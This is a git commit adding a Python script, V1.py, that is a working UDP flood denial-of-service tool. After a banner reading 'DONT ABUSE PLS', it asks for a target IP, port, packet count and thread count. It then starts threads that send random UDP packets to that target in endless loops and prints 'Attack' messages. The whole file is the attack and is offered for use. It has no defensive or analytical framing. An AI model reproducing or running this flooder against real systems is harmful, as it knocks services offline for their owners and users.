8e63a8fe482e4acf82cf285328cb800fab3620a2
AxeLOREZ <107378369+AxeLOREZ@users.noreply.github.com>
2022-07-04 07:22:24 +0700

    Add files via upload

---
+++ V1.py
@@ -0,0 +1,64 @@
+#!/usr/bin/env python3
+#/CODE PUNYA AXEL
+import struct
+import time
+import socket
+import random
+import threading
+import os
+import sys
+
+os.system ("clear")
+print ("""
+\033[94m
+     _              _     ___  ____  _____ _____
+    / \   __  _____| |   / _ \|  _ \| ____|__  /
+   / _ \  \ \/ / _ \ |  | | | | |_) |  _|   / / 
+  / ___ \  >  <  __/ |__| |_| |  _ <| |___ / /_ 
+ /_/   \_\/_/\_\___|_____\___/|_| \_\_____/____|
+                                                
+                    TOOLS BY AxeL
+                    DONT ABUSE PLS
+""")
+
+ip = str(input("\033[95m=====> IP Target    : "))
+port = int(input("=====> Port Target  : "))
+times = int(input("=====> $ Kirim PACKETS : "))
+threads = int(input("=====> $ Kirim THREADS : "))
+choice = str(input("=====> Siap? (y/n) : "))
+#Starting Attacking
+
+def run():
+	data = random._urandom(1024)
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(f" \033[92m[•] AxeLOREZ Attack Ip \033[91m{ip} \033[92mPort \033[91m{port} \033[92m!!!")
+		except:
+			print(f" \033[92m[×] AxeLOREZ Attack Ip \033[91m{ip} \033[92mPort \033[91m{port} \033[92m!!!")
+
+def run2():
+	data = random._urandom(16)
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(f" \033[92m[•] AxeLOREZ Attack Ip \033[91m{ip} \033[92mPort \033[91m{port} \033[92m!!!")
+		except:
+			print(f" \033[92m[×] AxeLOREZ Attack Ip \033[91m{ip} \033[92mPort \033[91m{port} \033[92m!!!")
+
+for y in range(threads):
+
+	if choice == 'y':
+
+		th = threading.Thread(target = run)
+		th.start()
+	else:
+		th = threading.Thread(target = run2)
+		th.start()
